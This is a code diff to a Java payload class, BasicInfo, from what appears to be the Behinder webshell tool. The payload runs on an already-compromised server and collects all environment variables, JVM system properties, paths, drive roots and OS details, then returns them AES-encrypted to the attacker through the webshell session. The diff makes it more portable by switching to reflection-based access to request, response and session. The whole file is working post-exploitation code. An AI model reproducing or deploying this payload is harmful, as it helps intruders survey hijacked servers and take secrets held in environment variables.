@@ -1,6 +1,7 @@
 package net.rebeyond.behinder.payload.java;
 
 import java.io.File;
+import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
@@ -9,69 +10,105 @@ import java.util.Set;
 import java.util.Map.Entry;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.jsp.PageContext;
 
 public class BasicInfo {
    public static String whatever;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      page.getResponse().setCharacterEncoding("UTF-8");
       String result = "";
+      boolean var22 = false;
+
+      Object so;
+      Method write;
+      label132: {
+         try {
+            var22 = true;
+            this.fillContext(obj);
+            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
+            Map env = System.getenv();
+            Iterator var5 = env.keySet().iterator();
+
+            while(var5.hasNext()) {
+               String name = (String)var5.next();
+               basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
+            }
+
+            basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
+            Properties props = System.getProperties();
+            Set entrySet = props.entrySet();
+            Iterator var7 = entrySet.iterator();
+
+            while(var7.hasNext()) {
+               Entry entry = (Entry)var7.next();
+               basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
+            }
+
+            String currentPath = (new File("")).getAbsolutePath();
+            String driveList = "";
+            File[] roots = File.listRoots();
+            File[] var10 = roots;
+            int var11 = roots.length;
+
+            for(int var12 = 0; var12 < var11; ++var12) {
+               File f = var10[var12];
+               driveList = driveList + f.getPath() + ";";
+            }
+
+            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
+            Map entity = new HashMap();
+            entity.put("basicInfo", basicInfo.toString());
+            entity.put("currentPath", currentPath);
+            entity.put("driveList", driveList);
+            entity.put("osInfo", osInfo);
+            entity.put("arch", System.getProperty("os.arch"));
+            result = this.buildJson(entity, true);
+            var22 = false;
+            break label132;
+         } catch (Exception var26) {
+            var22 = false;
+         } finally {
+            if (var22) {
+               try {
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var23) {
+               }
+
+            }
+         }
+
+         try {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var24) {
+         }
+
+         return true;
+      }
 
       try {
-         StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
-         Map env = System.getenv();
-         Iterator var6 = env.keySet().iterator();
-
-         while(var6.hasNext()) {
-            String name = (String)var6.next();
-            basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
-         }
-
-         basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
-         Properties props = System.getProperties();
-         Set entrySet = props.entrySet();
-         Iterator var8 = entrySet.iterator();
-
-         while(var8.hasNext()) {
-            Entry entry = (Entry)var8.next();
-            basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
-         }
-
-         String currentPath = (new File("")).getAbsolutePath();
-         String driveList = "";
-         File[] roots = File.listRoots();
-         File[] var11 = roots;
-         int var12 = roots.length;
-
-         for(int var13 = 0; var13 < var12; ++var13) {
-            File f = var11[var13];
-            driveList = driveList + f.getPath() + ";";
-         }
-
-         String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
-         Map entity = new HashMap();
-         entity.put("basicInfo", basicInfo.toString());
-         entity.put("currentPath", currentPath);
-         entity.put("driveList", driveList);
-         entity.put("osInfo", osInfo);
-         result = this.buildJson(entity, true);
-         String key = page.getSession().getAttribute("u").toString();
-         ServletOutputStream so = page.getResponse().getOutputStream();
-         so.write(Encrypt(result.getBytes(), key));
-         so.flush();
-         so.close();
-         page.getOut().clear();
-      } catch (Exception var15) {
-         var15.printStackTrace();
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(result.getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var25) {
       }
 
       return true;
    }
 
-   public static byte[] Encrypt(byte[] bs, String key) throws Exception {
+   private byte[] Encrypt(byte[] bs) throws Exception {
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -114,5 +151,20 @@ public class BasicInfo {
       sb.setLength(sb.length() - 1);
       sb.append("}");
       return sb.toString();
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
+      }
+
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 }
